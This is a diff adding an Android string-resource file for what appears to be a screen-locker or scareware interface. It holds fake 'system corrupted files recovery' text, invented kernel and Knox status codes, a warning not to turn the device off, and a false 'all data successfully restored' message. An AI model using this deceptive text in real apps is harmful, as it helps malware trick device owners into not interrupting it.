@@ -1,0 +1,13 @@
+<resources>
+    <string name="locker_header_text">Android system corrupted files recovery &lt;3e&gt;\n
+    Kernel version 2.1.0.3\n
+    DO NOT TURN THE SYSTEM OFF</string>
+    <string name="locker_info_text">SYSTEM STATUS: Official\n
+    KNOX KERNEL STATUS: 0x8\n
+    SYSTEM VOID: 0x8\n
+    STORAGE STATUS: Protected\n
+    BATTERY STATUS: Good</string>
+
+    <string name="locker_info_text_finished">All data successfully restored.\nPlease reboot your device</string>
+    <string name="locker_info_text_finished_bottom">Restored 154127 files</string>
+</resources>
